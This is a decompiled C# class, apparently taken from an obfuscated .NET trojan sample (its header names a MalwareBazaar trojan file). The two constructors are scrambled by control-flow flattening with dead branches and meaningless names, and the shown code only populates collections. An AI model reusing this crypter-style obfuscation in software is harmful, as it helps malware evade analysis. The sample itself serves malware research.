// Decompiled with JetBrains decompiler
// Type: DebuggerTypeProxyAttrib.Maps.DescriptorAttributeMapping
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Collections;
using DebuggerTypeProxyAttrib.Mappers;
using DebuggerTypeProxyAttrib.Pages;
using DebuggerTypeProxyAttrib.Resolver;
using System.Runtime.CompilerServices;
using System.Windows.Media;
using System.Windows.Media.Media3D;
using Tourield.Structs;

namespace DebuggerTypeProxyAttrib.Maps
{
  public class DescriptorAttributeMapping
  {
    public uint dispatcher;
    public string comparator;
    public GlobalErrorCollection m_Advisor;
    public Process registry;
    public ListResolverResolver creator;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public DescriptorAttributeMapping(ref uint task, GlobalErrorCollection caller)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              caller._Rule.Add(this.dispatcher, this.registry);
              this.creator.config = this.dispatcher;
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_8;
            case 1:
            case 4:
              this.creator = new ListResolverResolver();
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this.dispatcher = task;
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 3;
            case 2:
            case 6:
              ++task;
              this.registry._Template = this.dispatcher;
              this.registry = new Process(this.dispatcher);
              goto case 0;
            case 3:
              caller.token.Add(this.dispatcher, this.creator);
              num2 = 7;
              continue;
            case 5:
              goto label_8;
            case 7:
              goto label_10;
            default:
              goto label_6;
          }
        }
label_6:
        num1 = 0;
        continue;
label_8:
        RegistryPagePage.ListMethod();
        num1 = 4;
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public DescriptorAttributeMapping(
      Point3D def,
      Brush visitor,
      Vector3D dir,
      ref uint key2,
      GlobalErrorCollection v3,
      string second4)
    {
      int num1 = 3;
      if (DescriptorAttributeMapping.VisitAttribute())
        ;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 5:
            v3._Service.Add(this.dispatcher, this);
            num2 = 8;
            break;
          case 1:
            this.dispatcher = key2;
            num1 = 7;
            continue;
          case 2:
            this.creator = new ListResolverResolver();
            // ISSUE: explicit constructor call
            base.\u002Ector();
            num2 = 1;
            break;
          case 3:
            RegistryPagePage.ListMethod();
            num1 = 2;
            continue;
          case 4:
          case 6:
            this.registry._Tag = ErrorParserStructBuilder.AwakeOrder(new Point3D(this.registry.m_Descriptor.X, this.registry.m_Descriptor.Y, this.registry.m_Descriptor.Z), visitor);
            this.registry._Candidate = dir;
            num2 = 0;
            break;
          case 7:
            ++key2;
            this.registry = new Process(this.dispatcher);
            v3._Rule.Add(this.dispatcher, this.registry);
            this.creator.config = this.dispatcher;
            v3.token.Add(this.dispatcher, this.creator);
            this.comparator = second4;
            this.registry.m_Descriptor = def;
            goto case 4;
          case 8:
            goto label_1;
          default:
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 4;
        }
        num1 = num2;
      }
label_1:;
    }

    internal static bool SetupAttribute() => true;

    internal static bool VisitAttribute() => false;
  }
}
